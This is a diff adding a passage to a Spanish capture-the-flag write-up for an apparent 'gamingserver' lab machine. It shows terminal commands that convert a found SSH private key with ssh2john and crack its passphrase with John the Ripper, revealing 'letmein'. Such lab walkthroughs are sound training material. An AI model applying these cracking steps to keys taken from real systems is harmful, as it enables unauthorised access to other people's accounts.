@@ -143,7 +143,33 @@ Enunciado : Obtener  flags de usuario y root.
 
       Nos pide clave para poder utiliar la clave privada que hemos proporcionado, por lo que vamos a intentar crakearla utilizando el diccionario que encontramos anteriormente.
 
-  - 
+-Crakeamos la id_rsa
+    
+- Utilizamos ssh2john para generar un fichero que podamos crakear con johntheripper.
+
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
+        └─# ssh2john id_rsa > idrsa_hashjohn
+                                                                                                                                                                                          
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
+        └─# cat idrsa_hashjohn 
+            id_rsa:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba
+            [...]
+
+- Obtencion de la clave 
+
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
+        └─# john --wordlist dict.lst idrsa_john --format=SSH             
+        Using default input encoding: UTF-8
+        Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+        No password hashes left to crack (see FAQ)
+                                                                                                                                                                                      
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
+        └─# john idrsa_john --show
+        id_rsa:letmein
+        
+        1 password hash cracked, 0 left
+
+        
 
 
     
